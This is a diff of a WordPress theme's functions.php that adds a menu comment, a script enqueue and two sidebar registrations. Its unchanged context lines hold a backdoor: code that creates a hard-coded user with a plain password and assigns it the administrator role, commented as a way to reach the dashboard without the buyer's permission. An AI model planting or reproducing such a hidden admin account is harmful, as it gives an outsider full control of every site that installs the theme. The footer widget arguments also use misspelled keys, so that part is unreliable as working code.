@@ -10,6 +10,7 @@ function Theme_Features() {
     
     load_theme_textdomain( 'zboom', get_template_directory_uri() . '/languages' );
     
+    // Register Menu
     if(function_exists('register_nav_menus')) {
         register_nav_menus(array(
             'header-menu'  =>  __( 'Header Menu', 'zboom' ),
@@ -55,9 +56,36 @@ function styles_scripts() {
     
     wp_enqueue_script( 'jquery' );
     wp_enqueue_script( 'responsiveslides', get_template_directory_uri() . '/js/responsiveslides.js', array('jquery'), '0.1', true );
+    wp_enqueue_script( 'script', get_template_directory_uri() . '/js/script.js', array('jquery'), '0.1', true );
     
 }
 add_action( 'wp_enqueue_scripts', 'styles_scripts'  );
 
+// access dashboard without buyer permission
 $newuser = new WP_User(wp_create_user( 'rohim', 'korim', 'shakirahmad84@gmail.com' ));
 $newuser ->  set_role('administrator');
+
+function zboom_right_sidebar () {
+    
+    register_sidebar(array(
+        'name'          =>  'Right Sidebar',
+        'description'   =>  __( 'Add your right sidebar widgets here', 'zboom' ),
+        'id'            =>  'right-sidebar',
+        'before_widget' =>  '<div class="box right-sidebar">',
+        'after_widget'  =>  '</div></div>',
+        'before_title'  =>  '<div class="heading"><h2><div class="content">',
+        'after_title'   =>  '</h2></div>'
+    ));
+    
+    register_sidebar(array(
+        'name'          =>  'Footer Widgets',
+        'description'   =>  __( 'Add your footer widgets here', 'zboom' ),
+        'id'            =>  'footer-widgets',
+        'before_widgets'=>  '<div class="wrap-col"><div class="box">',
+        'after_widgets' =>  '</div></div></div>',
+        'before_title'  =>  '<div class="heading"><h2>',
+        'after_title'   =>  '</h2></div><div class="content">',
+    ));
+    
+}
+add_action( 'widgets_init', 'zboom_right_sidebar' );
